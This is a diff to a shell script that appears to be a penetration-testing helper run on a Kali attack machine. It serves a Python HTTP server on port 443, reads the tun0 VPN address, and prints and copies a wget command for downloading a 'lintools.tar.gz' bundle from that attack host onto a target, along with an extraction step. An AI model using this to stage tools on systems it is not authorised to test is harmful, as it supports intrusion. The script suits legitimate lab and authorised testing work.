@@ -29,3 +29,10 @@ python3 -m http.server 443 &>/dev/null &
 # Find python http server process ID 
 process_id=`ps -ef | grep 'python3 -m http.server 443' | awk 'NR==1{print $2}'`
 printf "[+] Python3 HTTP service is listening on process PID $process_id"
+kali_ip=`ip addr show tun0 | grep -v 'inet6' | grep inet | awk -F " " '{print $2}' | awk -F "/" '{print $1}'`
+echo "wget http://$kali_ip:443/lintools.tar.gz" | xclip -selection clipboard
+printf "Command to download lintools.tar.gz from the attack machine:\n
+wget http://$kali_ip:443/lintools.tar.gz\n
+\nCommand to extract lintools.tar.gz:\n
+tar xzf lintools.tar.gz" 
+
